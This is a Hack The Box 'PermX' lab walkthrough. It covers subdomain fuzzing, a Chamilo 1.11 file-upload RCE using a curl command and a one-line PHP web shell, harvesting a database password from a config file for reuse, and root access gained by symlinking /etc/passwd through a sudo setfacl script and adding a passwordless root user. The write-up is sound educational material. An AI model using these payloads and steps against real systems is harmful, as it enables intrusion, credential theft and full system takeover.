---
title: "Hack The Box (HTB) PermX Walk Through"
layout: single
read_time: true
comments: true
share: true
author_profile: true
header:
  overlay_color: "#000"
  overlay_filter: "0.5"
  overlay_image: /assets/christopher-burns-Kj2SaNHG-hg-unsplash.jpg
excerpt: "<br><br><br>"
categories:
  - tutorial
tags:
  - cybersecurity
  - penetration testing
---

This section is pulling from my online notes [here](https://calvin-connor.gitbook.io/hacking-notes/general/transferring-files/transferring-files-to-linux), or at https://notes.hobbes-sec.com/walk-throughs/hack-the-box/permx.

I recommend viewing the post there for a better layout.






PermX is an easy box involving out of date software, re-used passwords, and an abusable sudo-ran script.

# Recon

We begin our recon with an nmap scan. I like to first gather all open ports, and then  use awk to quickly extract the port numbers for a longer scan.

nmap -p- -Pn 10.10.11.23 > nmap.ports

cat nmap.ports | awk -F/ '/open/ {b=b","$1} END {print substr(b,2)}'
22,80

nmap -p 22,80 -sV -sC 10.10.11.23

Port 80 did not follow the redirect to http://permx.htb. We will add this to our /etc/hosts file and scan again.

10.10.11.23 permx.htb

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-20 20:03 EDT
Nmap scan report for permx.htb (10.10.11.23)
Host is up (0.035s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)
|_  256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: eLEARNING
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.88 seconds

We need information, and in SSH versus a website, the website has a far greater chance of having more valuable information. Upon inspection, this appears to be an e-learning static website. I say static because while there are a few input fields, as a whole there is really nothing to do on this website.

Before taking a deeper dive into the headers, input fields, directory busting, etc., we should make sure we are looking at all available information. The only other recon I can think of is subdomain enumeration, since we already discovered the virtual host of permx.htb. My favorite tool for this isffuf, as learning its intricacies allows you to do much more than just scan subdomains.

ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://permx.htb/ -H "Host:FUZZ.permx.htb"

Notice how we are using the-H (header) flag to insert a Host:header, allowing us to use the FUZZ keyword before .permx.htb and therefore inserting our wordlist to mass test various subdomains. If this feels confusing, look at any website request in Burp Suite and you will always see the Host: header at the top.

After running this command, all subdomains are returning to the output. We know there should only be a handful, if any, returning, so we need to further filter the results. My favorite way to do this is by filter the amount of words in each response. Notice how in the results below, all results are returning with Words: 18, probably saying that this subdomain does not exist.

tracking                [Status: 302, Size: 284, Words: 18, Lines: 10, Duration: 35ms]                                                                                                        
dev3                    [Status: 302, Size: 280, Words: 18, Lines: 10, Duration: 35ms]                                                                                                        
green                   [Status: 302, Size: 281, Words: 18, Lines: 10, Duration: 35ms]                                                                                                        
users                   [Status: 302, Size: 281, Words: 18, Lines: 10, Duration: 34ms]                                                                                                        
int                     [Status: 302, Size: 279, Words: 18, Lines: 10, Duration: 43ms]                                                                                                        
athena                  [Status: 302, Size: 282, Words: 18, Lines: 10, Duration: 36ms]                                                                                                        
www.static              [Status: 302, Size: 286, Words: 18, Lines: 10, Duration: 36ms]                                                                                                        
security                [Status: 302, Size: 284, Words: 18, Lines: 10, Duration: 35ms]                                                                                                        
www.info                [Status: 302, Size: 284, Words: 18, Lines: 10, Duration: 35ms]                                                                                                        
prod                    [Status: 302, Size: 280, Words: 18, Lines: 10, Duration: 35ms]                                                                                                        
mx02                    [Status: 302, Size: 280, Words: 18, Lines: 10, Duration: 35ms]                                                                                                        
team                    [Status: 302, Size: 280, Words: 18, Lines: 10, Duration: 35ms] 

Using ffuf --help, we can scroll down to the filter options and select the one that we need.

FILTER OPTIONS:                                                                                                                                                                               
  -fc                 Filter HTTP status codes from response. Comma separated list of codes and ranges                                                                                        
  -fl                 Filter by amount of lines in response. Comma separated list of line counts and ranges                                                                                   
  -fmode              Filter set operator. Either of: and, or (default: or)                                                                                                                   
  -fr                 Filter regexp                                                                                                                                                           
  -fs                 Filter HTTP response size. Comma separated list of sizes and ranges                                                                                                     
  -ft                 Filter by number of milliseconds to the first response byte, either greater or less than. EG: >100 or <100                                                              
  -fw                 Filter by amount of words in response. Comma separated list of word counts and ranges            

We will use the -fw flag to filter by amount of words in response. Since most requests were returning with 18 words, that is the amount we will filter out. We could also mess around with any of the other filter options to get the same results. Feel free to use any recognized subdomain list, Google will help you locate more.

ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://permx.htb/ -H "Host:FUZZ.permx.htb" -fw 18

Our scan returns two valid subdomains: lms and www, both of which we will add to our etc/hosts file and visit.
www.permx.htb
lms.permx.htb

While www.permx.htb looks the exact same as permx.htb, and we can confirm this as well, lms.permx.htb looks completely different. The first thing I see on this webpage is the Chamilo E-Learning & Collaboration Software image and I question if this is custom software for this box or public software that could have documented exploits, informational endpoints, and default credentials. I will try some general default credentials like admin:admin and even the password recovery feature to confirm that admin is a valid user.

I will run a directory bust using Feroxbuster

feroxbuster --url http://lms.permx.htb/

and begin picking my way through the most interesting directories. Eventually I come across the         /documentation/ directory and find the version of Chamilo to be 1.11.
http://lms.permx.htb/documentation/

A simple search for "Chamilo 1.11 exploit" reveals a page from Pentest Tools detailing a RCE (Remote Code Execution) exploit. Looking through the first exploit link, someone wrote a whole exploit script for a rather trivial exploit. The entire exploit boils down to one curl command.

curl -F "bigUploadFile=@filenamehere.php" "http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported"

I can tell this site can run PHP by the very thing we are exploiting being a .php extension. I will create a simple rev.php file with the following, allowing us to substitute the cmd option for whatever we desire.

<?php system($_REQUEST['cmd']); ?>

Substitute this file into the command above, and curl tells us that the file has been successfully uploaded. We could explore the exploit details to find the exact file upload path, but browsing from /bigUpload.php back to /inc, back to /bigupload shows the /files directory.

Inside here we find our rev.php file and can intercept this request in Burp Suite to more easily setup and retain our shell.

I will URL encode key characters to avoid any issues with the spaces and special characters.

Back on my box, I have a shell as www-data.

I will do a quick shell upgrade.

python3 -c 'import pty; pty.spawn("/bin/bash")'
CTRL + Z
stty raw -echo; fg
enter
export TERM=xterm-256color
reset (if things look weird)

Before jumping into scanning the box itself, remember that this website has a login page, meaning it stores passwords in one way or another. Most commonly, websites do this by connecting to a database, sometimes using plain text credentials in configuration files to do so. While manually looking through the directories of /var/www/chamilo, I come across the configuration.php file in /chamilo/app/config. Using the grep command below, I quickly look for any references to the string "pass". I pass the-i flag to ignore case sensitivity and using -n to include line numbers, so I know where to go in the file.

cat configuration.php | grep "pass" -i -n

I find the non-default password of "03F6lY3uXAP2bkW8" which is connecting to port 3306, the default port for MySQL. Before I connect to this database and explore there, I will test for any password reuse among other users with a shell.

By exploring /etc/passwd and looking for users with a shell, only the mtz user, besides root, appears available. Testing the password works.

Now as the mtz user, we can begin testing what access this user had that www-data did not. running sudo -l reveals a script that we can run without a password.

We have access to this file and can read the contents of exactly what it is doing.

Reading the script, it takes three arguments: the user, permissions, and the target. This script will give you whatever permissions you input to a file of your choice, as long as it is in the /home/mtz directory and the path does not inlcude any .., a common way to traverse directories backwards. The script first checks if if you included three arguments in your script. If not, the it exits and reminds you.

if [ "$#" -ne 3 ]; then
    /usr/bin/echo "Usage: $0 user perm file"
    exit 1
fi

Next the script checks if the targets path starts in /home/mtz and does not include any ...

if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
    /usr/bin/echo "Access denied."
    exit 1
fi

Finally, it checks if the target is a file and puts all the information into the setfacl command.

Check if the path is a file 
if [ ! -f "$target" ]; then 
    /usr/bin/echo "Target must be a file." 
    exit 1
fi
/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"

Since we cannot move out of the /home/mtz directory, we need someway to link a file in our directory to one in another, without having to be there.

By a simple google search, there is the ln command in Linux that links files together. Reading through the man pages shows two main options, creating a hard link vs a symbolic link. I suggest you read into the difference yourself, but the main differences are that hard links contain actual data of the file where symbolic links only contain a pointer to the data. Try both in the following command and it might make it more clear why only the symbolic link works for the exploit.

We could use a lot of different files to write data and get a shell that way, but what I am going to do is link to /etc/passwd and write my own root account.

ln -s /etc/passwd /home/mtz/test
sudo /opt/acl.sh mtz rw /home/mtz/test
echo "cookie::0:0:cookie:/root:/bin/bash" >> ./test
su cookie

Running the link command both hard and symbolically below shows the differences, where test is symbolic and test2 is hard.

Using su cookie, since we did not set a password, instantly sets us as the root cookie user.
